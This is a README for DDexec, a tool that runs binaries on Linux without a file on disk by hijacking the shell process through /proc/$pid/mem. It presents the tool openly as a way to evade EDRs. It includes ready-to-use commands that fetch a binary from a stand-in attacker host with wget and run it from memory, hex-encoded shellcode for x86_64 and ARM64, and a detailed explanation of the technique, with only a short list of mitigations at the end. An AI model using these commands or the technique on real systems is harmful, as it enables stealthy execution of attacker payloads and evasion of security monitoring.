# DDexec news
I have updated DDexec so much it is barely recognizable, the parsing of the ELF is now done by machine code instead of by the shell script, making it far faster, reliable and comprehensible. It has also reduced its number of dependencies to the absolute minimum.

It also now barely depends on the shell's arithmetic, [which may make it work on Android](https://github.com/arget13/DDexec/issues/13).

## Context
In Linux in order to run a program it must exist as a file, it must be accessible in some way through the file system hierarchy (this is just how `execve()` works). This file may reside on disk or in ram (tmpfs, memfd) but you need a filepath. This has made very easy to control what is run on a Linux system, it makes easy to detect threats and attacker's tools or to prevent them from trying to execute anything of theirs at all (_e. g._ not allowing unprivileged users to place executable files anywhere).

Well, if you cannot start the process you want... then you hijack and torture one already existing until it pleases your desires.

## Usage
Pipe into the `ddexec.sh` script the binary you want to run. The arguments for the script are the arguments for the program (starting with `argv[0]`).

Here, try this:
```
bash ddexec.sh ls -lA < /bin/ls
```
which is easily weaponizable with something like
```
wget -O- https://attacker.com/binary.elf | bash ddexec.sh argv0 foo bar
```

There is also the `ddsc.sh` script that allows you to run machine code directly.
The following is an example of the use of a shellcode that will create a memfd (a file descriptor pointing to a file in memory) to which we can later write binaries and run them, from memory obviously.
```
bash ddsc.sh -x <<< "68444541444889e74831f64889f0b401b03f0f054889c7b04d0f05b0220f05" &
cd /proc/$!/fd
wget -O 4 https://attacker.com/binary.elf
./4
```
In ARM64 the process is the same.
```
bash ddsc.sh -x <<< "802888d2a088a8f2e00f1ff8e0030091210001cae82280d2010000d4c80580d2010000d4881580d2010000d4610280d2281080d2010000d4"
```

Tested Linux distributions are Debian, Alpine and Arch. Supported shells are bash, zsh and ash (busybox); on x86_64 and aarch64 (arm64) architectures.

### EverythingExec
As of 12/12/2022 I have found a number of alternatives to `dd`, one of which, `tail`, is currently the default program used to `lseek()` through the `mem` file (which was the sole purpose for using `dd`). Said alternatives are:
```
tail
hexdump
cmp
xxd
```

Setting the variable `SEEKER` you may change the seeker used, *e. g.*:
```
SEEKER=cmp bash ddexec.sh ls -l <<< $(base64 -w0 /bin/ls)
```

If you find another valid seeker not implemented in the script you may still use it setting the `SEEKER_ARGS` variable:
```
SEEKER=xxd SEEKER_ARGS='-s $offset' zsh ddexec.sh ls -l <<< $(base64 -w0 /bin/ls)
```
Block this, EDRs.

## Dependencies
This script depends on the following tools to work.
```
bash | zsh | ash (busybox)
tail | dd | hexdump | cmp | xxd | any other program that allows us to seek through a fd
```
**In the case of ash**, tail, dd, hexdump, cmp and xxd are built-ins, so they aren't actually a dependency.

Note: It only works on modern versions of busybox, not sure of the oldest version, haven't looked it up. I know it works on v1.35.0, but it doesn't on v1.30.0.

## The technique
If you are able to modify arbitrarily the memory of a process then you can take over it. This can be used to hijack an already existing process and replace it with another program. We can achieve this either by using the `ptrace()` syscall (which requires you to have the ability to execute syscalls or to have gdb available on the system) or, more interestingly, writing to `/proc/$pid/mem`.

The file `/proc/$pid/mem` is a one-to-one mapping of the userland's address space of a process (_e. g._ from `0x0` to `0x7ffffffffffff000` in x86-64). This means that reading from or writing to this file at an offset `x` is the same as reading from or modifying the contents at the virtual address `x`.

Now, we have three basic problems to face:
- In general, only root and the program owner of the file may modify it.
- ASLR.
- If we try to read or write to an address not mapped in the address space of the program we will get an I/O error.

But we have clever solutions:
- Most shell interpreters allow the creation of file descriptors that will then be inherited by child processes. We can create a fd pointing to the `mem` file of the sell with write permissions... so child processes that use that fd will be able to modify the shell's memory.
- ASLR isn't even a problem, we can check the shell's `maps` file from the procfs in order to gain information about the address layout of the process.
- So we need to `lseek()` over the file. From the shell this can be done using a few common binaries, like `tail` or the infamous `dd`, see the *EverythingExec* section for more information.

### In more detail
The steps are relatively easy and do not require any kind of expertise to understand them:
* Obtain from `/proc/$pid/syscall` the address the process will return to after the syscall it is currently executing —since we are reading this file said syscall will be read(), and the address will be in the read() wrapper of the libc. This is just to get a place where our stager will be found shortly.
* Overwrite that place, which will be executable, with a stager (through `mem` we can modify unwritable pages). Said stager will read and execute a larger shellcode.
* This shellcode will, broadly speaking, perform the same steps that the kernel does upon each call to `execve()`:
    * Parse the binary, find what loader it needs, and the mappings they both need.
    * Create the mappings they need.
    * Read the binaries into them.
    * Set up permissions.
    * Finally initialize the stack with the arguments for the program and place the auxiliary vector (needed by the loader).
    * Jump into the loader and let it do the rest (load and link libraries needed by the program).

The shellcode has been generated by compiling loader.c, and tweaking its assembly to remove and simplify lots of artifacts introduced by the compiler.

## Contribute
Well, there are a couple of TODOs. Besides this, you may have noticed that I do not know much about shell scripting (I am more of a C programmer myself) and I am sure I must have won a decade worth of ["useless use of a cat"](https://porkmail.org/era/unix/award.html) awards —no cats were harmed in the making of this tool— and the rest of variants just with a fraction of this project.

— Port to other shells —in the limit we should make the script POSIX compliant.
- Allow to run the program with a non-empty environment.
- Load also in a fileless manner the loader for the program, in case it isn't on the target system (it may be a distribution with musl, for example, like alpine).
- And also allow to load (filelessly, of course) from another source the libraries needed, in case they aren't on the system (it may even be distroless and not have any library at all). For this, [memdlopen](https://github.com/arget13/memdlopen/) is probably the way.
- ddsc.sh needs a bit of an update.

Anyway, feel free to fork and PR. But please, when contributing take into account that PRs that make it not work on the supported shells will not be accepted, that is not contributing, that is just breaking stuff. It would be best if your changes are POSIX compliant.

Just... please, please, _please_, check your code and see if it does work on the supported shells at least on Debian and Alpine. It's just a couple of dockers.

## Credit
After publishing this tool I came to know that [Sektor7](https://www.sektor7.net) had already [published](https://blog.sektor7.net/#!res/2018/pure-in-memory-linux.md) this almost-exact same technique on their blog a few years ago.

Despite this, I thought this technique independently in, now almost, its entirety. Probably the smarter piece of this technique is the use of the inherited file descriptor, idea [provided](https://twitter.com/David3141593/status/1386661837073174532) by [David Buchanan](https://github.com/DavidBuchanan314) (inspired by Sektor7's blog) almost a year before I even started thinking about this topic. This alone not only makes the technique much simpler and neat, it also makes it far deadlier by eliminating the need to disable ASLR.

Either way, I hope I will be able to spread this technique much further, which is what matters.

I would like to thank [Carlos Polop](https://github.com/carlospolop), a great pentester and better friend, for making me think about this subject, and for his helpful feedback and interest, oh and I also owe him the name of the project. I am sure that if you are reading this you have already used his awesome tool [PEASS](https://github.com/carlospolop/PEASS-ng) and found helpful some article in his book [HackTricks](https://book.hacktricks.xyz).

## Now what?
You may:
- Go distroless. Well, in [certain scenarios](https://github.com/arget13/memexec/) it may not protect you at all.
- Use a kernel compiled without support for the `mem` file.
- Don't mount procfs.

## Questions? Death threats?
You can reach me through [Twitter](https://twitter.com/arget1313).
